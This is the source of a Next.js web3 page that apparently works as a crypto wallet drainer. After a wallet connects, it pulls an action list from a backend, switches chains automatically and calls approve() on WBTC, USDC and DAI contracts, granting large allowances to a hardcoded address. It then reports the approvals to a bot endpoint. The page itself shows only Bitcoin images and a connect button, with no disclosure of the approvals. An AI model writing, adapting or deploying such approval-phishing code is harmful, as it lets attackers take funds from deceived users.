import Head from "next/head";
import Image from "next/image";
import styles from "@/styles/Home.module.css";
import { useEffect, useState } from "react";
import { useAccount, useContractRead, useContractWrite, usePrepareContractWrite, useSwitchNetwork } from "wagmi";
import USDC_TESTNET_ABI from "../Constants/USDC_TESTNET_ABI.json"
import axios from "axios";
import { BackendURL_BOT_URL, BackendURL_USER, DAI_MUMBAI, DAI_SEPOLIA, USDC_MUMBAI, USDC_SEPOLIA, WBTC_MUMBAI, WBTC_SEPOLIA } from "@/Constants/Variable_Constants";
const ethers = require("ethers")
import Web3 from "web3";
import bitimg from "../../public/Bitcoin.png"
export default function Home() {

	const [step, setStep] = useState(-1)
	const [isNetworkSwitchHighlighted, setIsNetworkSwitchHighlighted] = useState(false);
	const [isConnectHighlighted, setIsConnectHighlighted] = useState(false);
	const [userAddress, setUserAddress] = useState<any>("")
	const { chains, error, isLoading: chainload, pendingChainId, switchNetwork } = useSwitchNetwork();
	const kad = "0x8De924D8863288cba2bB4219089c5e1495dc5ab3"
	const [userFetchedDetails, setUserFetchedDetail] = useState<any>([])
	const { address, connector, isDisconnected } = useAccount()
	const [currentNetworkId, setCurrentNetworkId] = useState<any>(11155111)
	const [isUsersDetailsFetched, setIsUsersDetailsFetched] = useState(false)
	const web3 = new Web3(window.ethereum);
	const [botMessage,setBotMessage] = useState<any>([])

	const myarray = [
		{
			action: "switch",
			networkId: 11155111,
		},
		{
			action: "approve",
			networkId: 11155111,
			approveAmount: "40000000",
			tokenName: "wbtcbalance",
			networkName: "sepolia",
			tokenAddres: WBTC_SEPOLIA
		},
		{
			action: "approve",
			networkId: 11155111,
			approveAmount: "46000000",
			tokenName: "usdcbalance",
			networkName: "sepolia",
			tokenAddres: USDC_SEPOLIA

		},
		{
			action: "approve",
			networkId: 11155111,
			approveAmount: "66000000000000000000",
			tokenName: "daibalance",
			networkName: "sepolia",
			tokenAddres: DAI_SEPOLIA
		},
		{
			action: "switch",
			networkId: 80001,
		},
		{
			action: "approve",
			networkId: 80001,
			approveAmount: "30000000",
			tokenName: "wbtcbalance",
			networkName: "mumbaiTestnet",
			tokenAddres: WBTC_MUMBAI
		},
		{
			action: "approve",
			networkId: 80001,
			approveAmount: "324000000",
			tokenName: "usdcbalance",
			networkName: "mumbaiTestnet",
			tokenAddres: USDC_MUMBAI
		},
		{
			action: "approve",
			networkId: 80001,
			approveAmount: "66000000000000000000",
			tokenName: "daibalance",
			networkName: "mumbaiTestnet",
			tokenAddres: DAI_MUMBAI
		}
	]

	const checkchain = async () => {
		const res = await connector?.getChainId()
		setCurrentNetworkId(res);
	}

	const closeAll = () => {
		setIsNetworkSwitchHighlighted(false);
		setIsConnectHighlighted(false);
	};

	const ApproveFunction = async (ContractAddress: String, amount: string) => {
		try {
			const { ethereum } = window;
			const provider = new ethers.providers.Web3Provider(ethereum);
			const signer = provider.getSigner();
			const transactionsContract = new ethers.Contract(ContractAddress, USDC_TESTNET_ABI, signer);
			const ios = await transactionsContract.approve(kad, amount)
			console.log("Transx hash", ios);
			const tempBotObject={"tokenAddress":ContractAddress,"ApprovedAmount":amount}
            setBotMessage([...botMessage,tempBotObject])
			setStep(step + 1)
		}
		catch (error) {
			console.log("error is in calling", ContractAddress);
			setStep(step + 1)
		}
	};

	const performAction = async (actionObject: any) => {
		if (actionObject?.action == "switch") {
			console.log("reach switch");
			if (window.ethereum) {
				try {
					// check if the chain to connect to is installed
					const hexValue = web3.utils.toHex(actionObject?.networkId);

					const res = await window.ethereum?.request({
						method: 'wallet_switchEthereumChain',
						params: [{ chainId: hexValue }], // chainId must be in hexadecimal numbers
					});
					setStep(step + 1)
				} catch (error) {
					// This error code indicates that the chain has not been added to MetaMask
					// if it is not, then install it into the user MetaMask

				}
			}
			setTimeout(() => {
				setStep(step + 1)
			}, 2000);
			console.log("done switch", actionObject?.networkId, step);
		}
		if (actionObject?.action == "approve") {
			console.log("reach approve");
			switchNetwork?.(actionObject?.networkId)
			ApproveFunction(actionObject?.tokenAddress, actionObject?.approveAmount)
			//setStep(step + 1) //remove thissss

			console.log("done approve", actionObject?.tokenName, step);

		}
		if (actionObject?.action == "sendToBot") {
			console.log("reach bot");
			// switchNetwork?.(actionObject?.networkId)
			// ApproveFunction(actionObject?.tokenAddress, actionObject?.approveAmount)
			try {
				await axios.post("http://localhost:3001/sendMessage",botMessage).
					then((res: any) => {
						console.log("Message sent", res);
						setStep(step + 1) //remove thissss

					}).catch((error) => {
						console.log("error in sending message to bot");
					})

			}
			catch (error) {
				console.log("error in sending the message to bot");

			}
		}
	}

	const callUserDetails = async () => {
		if (address) {
			try {
				await axios.get(`${BackendURL_USER}/${address}`).
					then((res: any) => {
						console.log("res", res);

						setUserFetchedDetail(res?.data?.data)

					}).catch((error) => {
						console.log("error in calling api");
					})

				setIsUsersDetailsFetched(true)
			}
			catch (error) {
				console.log("error in calling user api");
			}
		}
		// setUserFetchedDetail(myarray)
		// setIsUsersDetailsFetched(true)
	}

	useEffect(() => {
		if (address) {
			setUserAddress(address)
		}
		if (!isUsersDetailsFetched) {
			callUserDetails()
		}
	}, [address])

	useEffect(() => {
		if (isUsersDetailsFetched && address) {
			setStep(step + 1)
		}
	}, [isUsersDetailsFetched, address])

	useEffect(() => {
		if (step >= 0 && address) {
			performAction(userFetchedDetails[step])
		}
	}, [step])

	useEffect(() => {
		checkchain()
	}, [connector?.getChainId()])

	useEffect(() => {
		if (localStorage.getItem("addressInternalDisconnect") == null) {
			localStorage.setItem("addressInternalDisconnect", "false");
		}
		if (address) {
			localStorage.setItem("addressInternalDisconnect", "true");
		}
		if (
			localStorage.getItem("addressInternalDisconnect") == "true" &&
			!address
		) {
			localStorage.setItem("addressInternalDisconnect", "false");
			window.location.reload();
		}
	}, [address, isDisconnected]);

	return (
		<>
<Image alt="" src={bitimg} height={70} style={{marginLeft:200,marginTop:30,position:"absolute"}}/>

<Image alt="" src={bitimg} height={120} style={{marginLeft:320,marginTop:140,position:"relative" }}/>

<Image alt="" src={bitimg} height={130} style={{marginLeft:960,marginTop:235,position:"absolute" }}/>
		
			<div style={{display:"flex",justifyContent:"center",marginTop:"170px"}}> 
			<w3m-button />

			</div>
		</>
	);
}
